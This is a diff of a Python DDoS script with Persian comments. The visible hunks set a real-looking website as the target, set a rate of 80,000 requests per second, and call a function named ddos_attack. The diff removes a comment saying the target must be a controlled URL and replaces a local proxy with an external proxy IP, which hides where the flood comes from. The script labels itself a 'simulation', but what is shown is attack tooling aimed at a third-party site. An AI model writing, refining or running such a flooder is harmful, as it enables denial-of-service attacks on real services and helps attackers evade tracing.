@@ -3,17 +3,17 @@ import threading
 import time
 
 # تنظیمات هدف
-target_url = "https://elecmake.com"  # URL هدف (باید URL واقعی و کنترل‌شده باشد)
+target_url = "https://elecmake.com"  # URL هدف
 max_requests_per_second = 80000  # تعداد درخواست‌ها در ثانیه
 report_interval = 100  # تعداد درخواست‌ها برای گزارش‌دهی
 
 # شمارش درخواست‌ها
 request_count = 0
 
-# تنظیم پروکسی (در اینجا پروکسی لوکال با آی‌پی 127.0.0.1 و پورت 8080 تنظیم شده است)
+# تنظیم پروکسی
 proxies = {
-    "http": "http://127.0.0.1:8080",
-    "https": "http://127.0.0.1:8080"
+    "http": "http://46.249.100.228:3128",  # پروکسی HTTP
+    "https": "http://46.249.100.228:3128"  # پروکسی HTTPS
 }
 
 # تابع ارسال درخواست HTTP
@@ -41,6 +41,6 @@ def ddos_attack():
         time.sleep(1)  # 1 ثانیه تأخیر بین هر دسته از درخواست‌ها
 
 if __name__ == "__main__":
-    print("[INFO] Starting DDoS Attack Simulation with Proxy on Port 443...")
+    print("[INFO] Starting DDoS Attack Simulation with Proxy on Port 3128...")
     ddos_attack()
     print("[INFO] Attack finished.")
